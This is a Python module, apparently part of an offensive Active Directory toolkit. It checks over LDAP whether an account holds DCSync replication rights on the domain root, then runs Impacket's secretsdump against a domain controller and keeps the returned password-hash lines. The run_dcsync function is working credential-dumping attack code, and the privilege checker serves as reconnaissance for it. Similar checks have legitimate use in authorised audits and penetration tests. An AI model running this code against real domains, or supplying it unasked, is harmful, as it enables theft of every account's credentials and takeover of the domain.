import subprocess
import uuid

from ldap3 import BASE, NTLM, SUBTREE, Connection, Server
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars

from impacket.ldap.ldaptypes import LDAP_SID, SR_SECURITY_DESCRIPTOR


DCSYNC_GUIDS = {
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
}

CONTROL_ACCESS = 0x00000100
GENERIC_ALL = 0x10000000


def run_dcsync(domain, username, password, target):
    credential = f"{domain}/{username}:{password}@{target}"
    output = subprocess.run(
        ["python3", "app/utils/tools/secretsdump.py", credential],
        capture_output=True,
        text=True,
    )
    results = []

    if output.returncode != 0 and not output.stdout.strip():
        return ["DCSync failed. Verify target reachability and credentials."]

    for line in output.stdout.splitlines():
        parts = line.split(":")
        if len(parts) > 3 and parts[1].isdigit():
            results.append(line)

    if not results:
        return ["DCSync ran but no credential material was returned."]

    return results


def domain_to_dn(domain):
    return ",".join(f"DC={part}" for part in domain.split("."))


def sid_bytes_to_string(raw_sid):
    sid = LDAP_SID()
    sid.fromString(raw_sid)
    return sid.formatCanonical()


def connect(dc, domain, username, password):
    server = Server(dc, port=389, use_ssl=False)

    return Connection(
        server,
        user=f"{domain}\\{username}",
        password=password,
        authentication=NTLM,
        auto_bind=True,
    )


def get_user_dn_and_sid(conn, domain_dn, username):
    safe_username = escape_filter_chars(username)

    conn.search(
        search_base=domain_dn,
        search_filter=f"(&(objectClass=user)(sAMAccountName={safe_username}))",
        search_scope=SUBTREE,
        attributes=["distinguishedName", "objectSid"],
    )

    if not conn.entries:
        raise ValueError(f"User not found: {username}")

    user = conn.entries[0]
    return user.entry_dn, str(user.objectSid)


def get_user_token_sids(conn, user_dn, user_sid):
    sids = {user_sid}

    conn.search(
        search_base=user_dn,
        search_filter="(objectClass=*)",
        search_scope=BASE,
        attributes=["tokenGroups"],
    )

    if conn.entries and "tokenGroups" in conn.entries[0]:
        for raw_sid in conn.entries[0]["tokenGroups"].raw_values:
            sids.add(sid_bytes_to_string(raw_sid))

    return sids


def get_domain_security_descriptor(conn, domain_dn):
    controls = security_descriptor_control(sdflags=0x04)

    conn.search(
        search_base=domain_dn,
        search_filter="(objectClass=domainDNS)",
        search_scope=BASE,
        attributes=["nTSecurityDescriptor"],
        controls=controls,
    )

    if not conn.entries:
        raise ValueError("Could not read the domain root security descriptor")

    raw_sd = conn.entries[0]["nTSecurityDescriptor"].raw_values[0]

    sd = SR_SECURITY_DESCRIPTOR()
    sd.fromString(raw_sd)

    return sd


def object_type_guid(ace_data):
    try:
        raw_guid = ace_data["ObjectType"]
        if raw_guid:
            return str(uuid.UUID(bytes_le=raw_guid)).lower()
    except Exception:
        pass

    return None


def check_dcsync_privileges(sd, token_sids):
    found = set()

    dacl = sd["Dacl"]
    if dacl is None:
        return found

    for ace in dacl.aces:
        try:
            ace_data = ace["Ace"]
            ace_sid = ace_data["Sid"].formatCanonical()
            mask = ace_data["Mask"]["Mask"]

            if ace_sid not in token_sids:
                continue

            if mask & GENERIC_ALL:
                found.add("GenericAll / Full Control")

            if mask & CONTROL_ACCESS:
                guid = object_type_guid(ace_data)

                if guid is None:
                    found.add("AllExtendedRights")
                elif guid in DCSYNC_GUIDS:
                    found.add(DCSYNC_GUIDS[guid])

        except Exception:
            continue

    return found


def check_dcsync(domain, username, password, target):
    domain_dn = domain_to_dn(domain)

    try:
        conn = connect(target, domain, username, password)
        user_dn, user_sid = get_user_dn_and_sid(conn, domain_dn, username)
        token_sids = get_user_token_sids(conn, user_dn, user_sid)
        sd = get_domain_security_descriptor(conn, domain_dn)
        rights = check_dcsync_privileges(sd, token_sids)
    except Exception as exc:
        return [f"DCSync check failed: {exc}"]

    if rights:
        lines = ["User HAS DCSync or DCSync-equivalent rights:"]
        for right in sorted(rights):
            lines.append(f"- {right}")
        return lines

    return ["User does NOT have DCSync rights."]
